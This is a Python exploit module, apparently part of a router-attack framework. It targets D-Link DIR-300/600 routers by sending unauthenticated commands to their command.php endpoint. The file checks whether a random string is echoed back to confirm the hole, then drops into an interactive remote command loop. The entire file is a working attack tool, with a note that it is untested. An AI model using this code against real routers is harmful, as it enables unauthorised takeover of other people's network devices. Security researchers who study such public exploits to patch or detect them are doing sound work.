#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DIR 300 600 Remote Command Execute',
        'description': 'D-Link DIR 300 600 allow remote command execute without credits',
        'reference': [
            'http://www.s3cur1ty.de/home-network-horror-days',
            'http://www.s3cur1ty.de/m1adv2013-003',
        ],
    }

    prompt = 'dir_command_rce'

    def __init__(self):
        super().__init__()

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        if self.check(host, port, timeout):
            self.command_loop(host, port, timeout)
        else:
            pass

    def check(self, host, port, timeout):
        cmd = utils.random_text(6)
        resp = self.execute(host, port, timeout, cmd)
        if cmd in resp:
            self.print_check_result(True, host)
            return True
        else:
            self.print_check_result(False, host)
            return False

    def execute(self, host, port, timeout, cmd):
        url = "http://{}:{}/command.php".format(host, port)
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = "cmd={}".format(cmd)

        resp, err = self.http_post(self.s, url, timeout, data, headers=headers)
        if err:
            self.print_requests_err(host, port, err)
            return ''

        return resp.text.strip()
